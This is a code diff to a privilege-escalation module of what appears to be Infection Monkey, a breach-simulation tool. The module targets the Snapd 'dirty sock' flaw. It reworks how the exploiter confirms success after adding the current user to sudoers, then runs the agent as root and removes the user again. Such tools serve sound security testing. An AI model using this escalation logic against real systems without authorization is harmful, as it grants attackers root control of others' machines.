@@ -6,7 +6,6 @@
 """
 import os
 import time
-import base64
 import string
 import socket
 import random
@@ -18,7 +17,7 @@ from logging import getLogger
 from infection_monkey.utils.environment import OperatingSystem, OperatingSystemTypes, OperatingSystemVersion
 from infection_monkey.privilege_escalation.actions import HostPrivExploiter
 from infection_monkey.privilege_escalation.actions.tools import REMOVE_LASTLINE, ADDUSER_TO_SUDOERS
-from infection_monkey.privilege_escalation.actions.tools import check_if_sudoer, shell, run_monkey_as_root
+from infection_monkey.privilege_escalation.actions.tools import is_sudo_paswordless, shell, run_monkey_as_root
 LOG = getLogger(__name__)
 
 __author__ = "D3fa1t"
@@ -249,34 +248,17 @@ class SnapdExploiter(HostPrivExploiter):
         if not whoami:
             return False
 
-        # we create a temp file in /tmp as root to verify command exec as root
-        alphabet = string.ascii_lowercase
-        filename = ''.join(random.choice(alphabet) for _ in range(10))
-
         # add the user to the sudo group
         add_user_to_sudoers = ADDUSER_TO_SUDOERS % {'user_name': whoami}
 
-        if run_command_as_root(add_user_to_sudoers):
-
-            # check if exploit is successful by touching a file and checking the owner
-            file_path = os.path.join('/tmp/', filename)
-            touch_file = "sudo touch " + file_path
-            shell(touch_file)
-            LOG.info("Touching the file %s" % touch_file)
-            if not check_if_sudoer(file_path):
-                LOG.info("Either file doesn't exist or is not owned by root!")
-                return False
-        else:
+        if not run_command_as_root(add_user_to_sudoers) or not is_sudo_paswordless():
             LOG.info("Snapd Privilege escalation was not successful!")
             return False
 
-        LOG.info("The command that is executed as root is %s" % add_user_to_sudoers)
-        # now run the monkey as root
-        run_monkey_as_root(command_line)
+        LOG.info("Snapd dirty sock privilege escalation successful!")
 
-        # cleaning up the temp file
-        cleanup_file = "rm "+file_path
-        shell(cleanup_file)
+        LOG.info("Running monkey as root")
+        run_monkey_as_root(command_line)
 
         # now remove the user from sudoers
         LOG.info("Removing the current user %s from the sudoers list", whoami)
